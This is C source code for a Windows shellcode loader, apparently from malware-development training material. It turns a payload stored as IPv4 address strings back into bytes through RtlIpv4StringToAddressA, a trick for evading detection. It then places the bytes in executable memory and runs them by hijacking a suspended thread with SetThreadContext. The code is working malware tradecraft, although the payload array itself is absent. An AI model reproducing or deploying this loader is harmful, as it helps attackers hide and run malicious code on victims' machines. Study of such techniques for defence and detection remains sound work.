
typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR S,
    BOOLEAN Strict,
    PCSTR* Terminator,
    PVOID Addr
);

VOID DummyFunction() {
    int j = rand();
    int i = j*j;
}


BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer			= NULL, 
			TmpBuffer		= NULL;

	SIZE_T		sBuffSize		= 0;

	PCSTR		Terminator		= NULL;

	NTSTATUS	STATUS;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in Ipv4Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 address at a time
		// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
			return FALSE;
		}

		// 4 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress		= pBuffer;
	*pDSize			= sBuffSize;

	return TRUE;
}

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



int main() {
    PBYTE pDeobfuscatedPayload;
    SIZE_T sDeobfuscatedSize = 0;
    DWORD dwOldProtection = 0;

    if (!Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }

    printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDeobfuscatedPayload, sDeobfuscatedSize);
    for (size_t i = 0; i < sDeobfuscatedSize; i++){
	if (i % 16 == 0)
	    printf("\n\t");

	printf("%0.2X ", pDeobfuscatedPayload[i]);
    }

    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);


    HANDLE hThread = NULL;
    
    // Creating sacrificial thread in suspended state 
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
    	printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
    	return FALSE;
    }
    
    // Hijacking the sacrificial thread created
    if (!RunViaClassicThreadHijacking(hThread, pDeobfuscatedPayload, sDeobfuscatedSize)) {
    	return -1;
    }
    
    printf("Resuming Thread");
    // Resuming suspended thread, so that it runs our shellcode
    ResumeThread(hThread);
    
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    
    return 0;
}

